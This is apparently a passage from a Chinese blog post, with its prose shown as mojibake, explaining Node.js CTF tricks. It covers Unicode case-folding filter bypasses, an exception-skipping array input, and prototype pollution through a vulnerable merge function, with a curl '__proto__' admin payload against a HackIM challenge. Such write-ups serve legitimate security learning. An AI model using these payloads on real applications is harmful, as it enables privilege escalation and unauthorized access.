ä¸ªç‰¹æ®Šçš„å­—ç¬¦éœ€è¦è®°å½•ä¸€ä¸‹</p><p>å¯¹äº<code>toUpperCase()/toLowerCase()</code>ï¼š</p><p><code>&#39;Ä±&#39;.toUpperCase()=&#39;I&#39;</code>ï¼Œ<code>&#39;Å¿&#39;.toUpperCase()=&#39;S&#39;</code>ï¼Œ<code>&#39;â„ª&#39;.toLowerCase()=&#39;k&#39;</code></p><p>åœ¨ç»•ä¸€äº›è§„åˆ™çš„æ—¶å€™å°±å¯ä»¥åˆ©ç”¨è¿™å‡ ä¸ªç‰¹æ®Šå­—ç¬¦è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯ä¸ä¼šæ˜¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2022è¥¿æ¹–è®ºå‰‘</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.<span class="property">body</span>.<span class="property">checkcode</span>?req.<span class="property">body</span>.<span class="property">checkcode</span>:<span class="number">1234</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span>(checkcode.<span class="property">length</span> === <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            checkcode = checkcode.<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">if</span>(checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>()&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/getflag2&quot;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckController</span>(req,res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>æˆ‘ä¹Ÿä¸çŸ¥é“ç½‘ä¸Šé‚£äº›äººæŠ„çš„å•¥ä¸œè¥¿ï¼ŒæŠ„éƒ½æŠ„ä¸æ˜ç™½ï¼Œè¿™é‡Œä¸æ˜¯ä»€ä¹ˆarrayå¤§å°å†™ç»•è¿‡ï¼ŒåŸç†åº”è¯¥æ˜¯ï¼šä¼ ä¸ª array è¿›å»çš„è¯ï¼Œè°ƒç”¨ <code>.toLowerCase()</code> ç”¨æ³•ä¼šæŠ¥é”™ <code>Uncaught TypeError: checkcode.toLowerCase is not a function</code>ï¼Œä½†æ˜¯æ•è·å¼‚å¸¸è¿™é‡Œç›´æ¥å°±èƒ½è·³è¿‡äº†ï¼Œè¿”å›ç¬¬äºŒéƒ¨åˆ† flag</p><h2 id="åŸå‹é“¾ä¸ç»§æ‰¿"><a href="#åŸå‹é“¾ä¸ç»§æ‰¿" class="headerlink" title="åŸå‹é“¾ä¸ç»§æ‰¿"></a>åŸå‹é“¾ä¸ç»§æ‰¿</h2><p>JavaScriptçš„åŸå‹é“¾æ˜¯ä¸€ç§ç‰¹æ®Šçš„æœºåˆ¶ï¼Œç”¨äºå®ç°å¯¹è±¡ä¹‹é—´çš„ç»§æ‰¿å…³ç³»ã€‚åœ¨JavaScriptä¸­ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼ˆprototypeï¼‰ï¼Œå®ƒå¯ä»¥åŒ…å«å±æ€§å’Œæ–¹æ³•ã€‚å½“æˆ‘ä»¬è®¿é—®å¯¹è±¡çš„å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œå¦‚æœè¯¥å¯¹è±¡æœ¬èº«æ²¡æœ‰è¿™ä¸ªå±æ€§æˆ–æ–¹æ³•ï¼ŒJavaScriptä¼šé€šè¿‡åŸå‹é“¾å‘ä¸ŠæŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°è¯¥å±æ€§æˆ–æ–¹æ³•æˆ–åˆ°è¾¾åŸå‹é“¾çš„æœ«å°¾ï¼ˆnullï¼‰ã€‚</p><p>å…·ä½“æ¥è¯´ï¼ŒJavaScriptä¸­çš„å¯¹è±¡æ˜¯é€šè¿‡æ„é€ å‡½æ•°ï¼ˆConstructorï¼‰åˆ›å»ºçš„ã€‚æ„é€ å‡½æ•°æ˜¯ä¸€ä¸ªæ™®é€šçš„å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>new</code>å…³é”®å­—æ¥å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ã€‚æ¯ä¸ªæ„é€ å‡½æ•°éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼ˆprototypeï¼‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ™®é€šçš„å¯¹è±¡ï¼Œç”¨äºå­˜å‚¨è¯¥æ„é€ å‡½æ•°åˆ›å»ºçš„æ‰€æœ‰å®ä¾‹å…±äº«çš„å±æ€§å’Œæ–¹æ³•ã€‚</p><p>å½“æˆ‘ä»¬è®¿é—®å¯¹è±¡çš„å±æ€§æˆ–æ–¹æ³•æ—¶ï¼ŒJavaScripté¦–å…ˆæ£€æŸ¥è¯¥å¯¹è±¡æœ¬èº«æ˜¯å¦å…·æœ‰è¯¥å±æ€§æˆ–æ–¹æ³•ã€‚å¦‚æœæ²¡æœ‰ï¼Œå®ƒä¼šç»§ç»­åœ¨åŸå‹å¯¹è±¡ä¸ŠæŸ¥æ‰¾ã€‚å¦‚æœåŸå‹å¯¹è±¡ä¹Ÿæ²¡æœ‰è¯¥å±æ€§æˆ–æ–¹æ³•ï¼ŒJavaScriptä¼šç»§ç»­åœ¨åŸå‹å¯¹è±¡çš„åŸå‹ä¸ŠæŸ¥æ‰¾ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°æ‰¾åˆ°è¯¥å±æ€§æˆ–æ–¹æ³•æˆ–åˆ°è¾¾åŸå‹é“¾çš„æœ«å°¾ã€‚</p><p>é€šè¿‡åŸå‹é“¾ï¼Œå¯¹è±¡å¯ä»¥ç»§æ‰¿åŸå‹å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„å®ä¾‹æ—¶ï¼Œè¯¥å®ä¾‹ä¼šè‡ªåŠ¨å…³è”åˆ°æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼Œä»è€Œç»§æ‰¿äº†åŸå‹å¯¹è±¡ä¸Šçš„å±æ€§å’Œæ–¹æ³•ã€‚è¿™ç§ç»§æ‰¿æ–¹å¼ç§°ä¸ºåŸå‹ç»§æ‰¿ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªæ„é€ å‡½æ•°</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åœ¨æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ä¸Šæ·»åŠ æ–¹æ³•</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHello</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello, my name is &#x27;</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ª Person å¯¹è±¡çš„å®ä¾‹</span></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;John&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è°ƒç”¨å®ä¾‹çš„æ–¹æ³•</span></span><br><span class="line">person1.<span class="title function_">sayHello</span>(); <span class="comment">// è¾“å‡º: Hello, my name is John</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥å¯¹è±¡å’ŒåŸå‹ä¹‹é—´çš„å…³ç³»</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;name&#x27;</span>)); <span class="comment">// è¾“å‡º: true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;sayHello&#x27;</span>)); <span class="comment">// è¾“å‡º: false</span></span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªæ„é€ å‡½æ•°<code>Person</code>ï¼Œå¹¶åœ¨å…¶åŸå‹å¯¹è±¡ä¸Šæ·»åŠ äº†ä¸€ä¸ªæ–¹æ³•<code>sayHello</code>ã€‚é€šè¿‡<code>new Person(&#39;John&#39;)</code>åˆ›å»ºçš„å®ä¾‹<code>person1</code>ç»§æ‰¿äº†<code>Person</code>æ„é€ å‡½æ•°åŸå‹å¯¹è±¡ä¸Šçš„<code>sayHello</code>æ–¹æ³•ã€‚é€šè¿‡<code>person1.sayHello()</code>è°ƒç”¨äº†ç»§æ‰¿çš„æ–¹æ³•ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒJavaScriptä¸­çš„åŸå‹ç»§æ‰¿æ˜¯åŸºäºå¯¹è±¡çš„ï¼Œè€Œä¸æ˜¯ç±»çš„ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åŠ¨æ€åœ°ä¿®æ”¹åŸå‹å¯¹è±¡ï¼Œä»è€Œå½±å“åˆ°å·²ç»åˆ›å»ºçš„å®ä¾‹ã€‚è¿™ä¹Ÿæ˜¯JavaScriptä¸­çš„ä¸€é¡¹å¼ºå¤§å’Œçµæ´»çš„ç‰¹æ€§ã€‚</p><h2 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h2><p>è¿™ä¸ªä¸œè¥¿æ˜¯æ€ä¹ˆæ ·äº§ç”Ÿçš„ï¼Ÿï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œç»“æŸğŸ¶</p><p>åŸå‹é“¾æ±¡æŸ“æ˜¯ä¸€ç§ç‰¹å®šçš„å®‰å…¨æ¼æ´ï¼Œå®ƒåˆ©ç”¨äº†JavaScriptä¸­çš„åŸå‹é“¾ç»§æ‰¿æœºåˆ¶ã€‚åœ¨Node.jsä¸­ï¼ŒåŸå‹é“¾æ±¡æŸ“å¯ä»¥å¯¼è‡´æ„å¤–çš„è¡Œä¸ºå’Œå®‰å…¨é—®é¢˜ã€‚</p><p>åŸå‹é“¾æ±¡æŸ“çš„åŸç†å¦‚ä¸‹ï¼š</p><ol><li>JavaScriptä¸­çš„æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåŸå‹ï¼ˆprototypeï¼‰å±æ€§ï¼Œå®ƒæŒ‡å‘å¦ä¸€ä¸ªå¯¹è±¡ã€‚å½“è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼Œå¦‚æœè¯¥å¯¹è±¡æœ¬èº«æ²¡æœ‰è¯¥å±æ€§ï¼ŒJavaScriptä¼šæ²¿ç€åŸå‹é“¾å‘ä¸ŠæŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°è¯¥å±æ€§æˆ–è€…åˆ°è¾¾åŸå‹é“¾çš„æœ«å°¾ï¼ˆnullï¼‰ä¸ºæ­¢ã€‚</li><li>åŸå‹é“¾æ±¡æŸ“åˆ©ç”¨äº†åŸå‹é“¾çš„åŠ¨æ€æ€§ã€‚é€šè¿‡ä¿®æ”¹åŸå‹å¯¹è±¡ï¼Œå¯ä»¥å½±å“åˆ°æ‰€æœ‰ç»§æ‰¿è‡ªè¯¥åŸå‹å¯¹è±¡çš„å®ä¾‹ã€‚</li><li>åœ¨Node.jsä¸­ï¼ŒåŸå‹é“¾æ±¡æŸ“é€šå¸¸å‘ç”Ÿåœ¨ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—æˆ–åº“æ—¶ï¼Œç‰¹åˆ«æ˜¯åœ¨è§£æå’Œå¤„ç†ç”¨æˆ·è¾“å…¥æ—¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¾“å…¥ï¼Œä¿®æ”¹åŸå‹å¯¹è±¡ï¼Œä»è€Œå½±å“åˆ°æ•´ä¸ªåº”ç”¨ç¨‹åºçš„è¡Œä¸ºã€‚</li><li>ä¸€ç§å¸¸è§çš„åŸå‹é“¾æ±¡æŸ“æ”»å‡»æ˜¯é€šè¿‡ä¿®æ”¹Object.prototypeå¯¹è±¡æ¥æ±¡æŸ“å…¨å±€ç¯å¢ƒã€‚ç”±äºå¤§å¤šæ•°å¯¹è±¡éƒ½ç»§æ‰¿è‡ªObject.prototypeï¼Œå› æ­¤ä¿®æ”¹å®ƒçš„å±æ€§ä¼šå½±å“åˆ°æ•´ä¸ªåº”ç”¨ç¨‹åºã€‚</li><li>æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹Object.prototypeçš„å±æ€§ï¼Œä¾‹å¦‚æ·»åŠ ä¸€ä¸ªåä¸º<code>__proto__</code>çš„å±æ€§ï¼Œæ¥æ”¹å˜å¯¹è±¡çš„åŸå‹é“¾ã€‚è¿™æ ·ä¸€æ¥ï¼Œæ‰€æœ‰ç»§æ‰¿è‡ªObject.prototypeçš„å¯¹è±¡éƒ½ä¼šå—åˆ°å½±å“ã€‚</li></ol><p>ä¸‹é¢çš„æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p><p>å¦‚æœæˆ‘ä»¬æœ‰</p><p><code>object[a][b] = value</code></p><p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶ aã€bã€value çš„å€¼ï¼Œå°† a è®¾ç½®ä¸º<code>__proto__</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç»™ object å¯¹è±¡çš„åŸå‹è®¾ç½®ä¸€ä¸ª b å±æ€§ï¼Œå€¼ä¸º valueã€‚è¿™æ ·æ‰€æœ‰ç»§æ‰¿ object å¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡å°±ä¼šåœ¨æœ¬èº«ä¸æ‹¥æœ‰ b å±æ€§çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§ï¼Œä¸”å€¼ä¸ºvalueã€‚</p><p>ç¤ºä¾‹ï¼š</p><img src="/img/loading.gif" data-original="/blog/2023/10/13/node-js-%E6%88%91%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF%E5%AD%A6%E5%AD%A6%E5%AD%A6%EF%BC%81/1.png" title="wuhu"> <img src="/img/loading.gif" data-original="/blog/2023/10/13/node-js-%E6%88%91%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF%E5%AD%A6%E5%AD%A6%E5%AD%A6%EF%BC%81/2.png" title="wuhu"><p>ä¸¤ç§æ–¹æ³•éƒ½å¯ä»¥å“¦ã€‚</p><ul><li><input checked disabled type="checkbox"> å…ˆåˆ°è¿™é‡Œï¼Œå­¦è¯¾å†…å»äº†ï¼ˆä¸æƒ³æŒ‚ç§‘</li></ul><h3 id="mergeç±»"><a href="#mergeç±»" class="headerlink" title="mergeç±»"></a>mergeç±»</h3><p>åœ¨Node.jsä¸­ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨Mergeç±»æ“ä½œæ¥åˆå¹¶å¯¹è±¡æ—¶ï¼Œå¦‚æœåˆå¹¶çš„å¯¹è±¡ä¸­åŒ…å«äº†æ¶æ„çš„å±æ€§ï¼Œå°±æœ‰å¯èƒ½å¯¼è‡´åŸå‹é“¾æ±¡æŸ“ã€‚æ¶æ„çš„å±æ€§å¯ä»¥æ˜¯ä¸€ä¸ªå‡½æ•°æˆ–ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼Œå®ƒä»¬ä¼šè¢«æ·»åŠ åˆ°ç›®æ ‡å¯¹è±¡çš„åŸå‹é“¾ä¸Šï¼Œä»è€Œå½±å“åˆ°å…¶ä»–å¯¹è±¡ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Nullcon HackIM</span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clone</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constants</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">8080</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HOST</span> = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> admin = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// App</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())    <span class="comment">// è°ƒç”¨ä¸­é—´ä»¶è§£æjson</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/signup&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">    <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">    <span class="keyword">if</span> (copybody.<span class="property">name</span>) &#123;</span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">&#x27;name&#x27;</span>, copybody.<span class="property">name</span>).<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="string">&quot;done&quot;</span>: <span class="string">&quot;cookie set&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="string">&quot;error&quot;</span>: <span class="string">&quot;cookie not set&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/getFlag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> Ğ°dmin = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">cookies</span>))</span><br><span class="line">    <span class="keyword">if</span> (admin.Ğ°dmin == <span class="number">1</span>) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;hackim19&#123;&#125;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;You are not authorized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="variable constant_">HOST</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Running on http://<span class="subst">$&#123;HOST&#125;</span>:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><p>æœ€ç®€å•çš„payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv --header <span class="string">&#x27;Content-type: application/json&#x27;</span> -d <span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;admin&quot;: 1&#125;&#125;&#x27;</span> <span class="string">&#x27;http://0.0.0.0:4000/signup&#x27;</span>; curl -vv <span class="string">&#x27;http://0.0.0.0:4000/getFlag&#x27;</span></span><br></pre></td></tr></table></figure><p>åŸç†ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">objA, objB</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(objB); <span class="comment">// æ‰“å° &#123; __proto__: &#123; admin: 1 &#125; &#125;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> objB) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å½“å‰å±æ€§: &quot;</span> + key); <span class="comment">// æ‰“å° å½“å‰å±æ€§: __proto__        </span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(objA[key]) &amp;&amp; <span class="title function_">isObject</span>(objB[key])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(objA[key], objB[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            objA[key] = objB[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> objA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clone</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Merge()å‡½æ•°é¦–å…ˆè¿­ä»£ç¬¬äºŒä¸ªå¯¹è±¡ï¼ˆobjBï¼‰ä¸Šçš„æ‰€æœ‰å±æ€§ï¼ˆå› ä¸ºåœ¨ç›¸åŒçš„é”®å€¼å¯¹çš„æƒ…å†µä¸‹ï¼Œç¬¬äºŒä¸ªå¯¹è±¡ä¼˜å…ˆï¼‰ã€‚<br>å¦‚æœå±æ€§åŒæ—¶å­˜åœ¨äºç¬¬ä¸€ä¸ªå¯¹è±¡ï¼ˆobjAï¼‰å’Œç¬¬äºŒä¸ªå¯¹è±¡ï¼ˆobjBï¼‰ä¸Šï¼Œå¹¶ä¸”å®ƒä»¬éƒ½æ˜¯Objectç±»å‹ï¼Œé‚£ä¹ˆMerge()å‡½æ•°å°†é‡æ–°å¼€å§‹åˆå¹¶å®ƒä»¬ã€‚<br>ç°åœ¨ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶objB[key]çš„å€¼ï¼Œå¹¶å°†keyè®¾ç½®ä¸º<code>__proto__</code>ï¼Œè¿˜å¯ä»¥æ§åˆ¶objBä¸­<code>proto</code>å±æ€§å†…çš„å€¼ï¼Œé‚£ä¹ˆå½“é€’å½’è¿›è¡Œæ—¶ï¼ŒobjA[key]åœ¨æŸä¸ªç‚¹å®é™…ä¸Šå°†æŒ‡å‘objAçš„åŸå‹ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±èƒ½æˆåŠŸåœ°å‘æ‰€æœ‰å¯¹è±¡æ·»åŠ ä¸€ä¸ªæ–°å±æ€§ã€‚</p><p><code>&#123; proto: &#123; admin: 1 &#125; &#125;</code>ï¼Œå…¶ä¸­<code>__proto__</code>åªæ˜¯ä¸€ä¸ªå±æ€§åï¼Œå®é™…ä¸Šå¹¶ä¸æŒ‡å‘å‡½æ•°åŸå‹ã€‚åœ¨<code>merge()</code>å‡½æ•°ä¸­ï¼Œé€šè¿‡<code>for (var 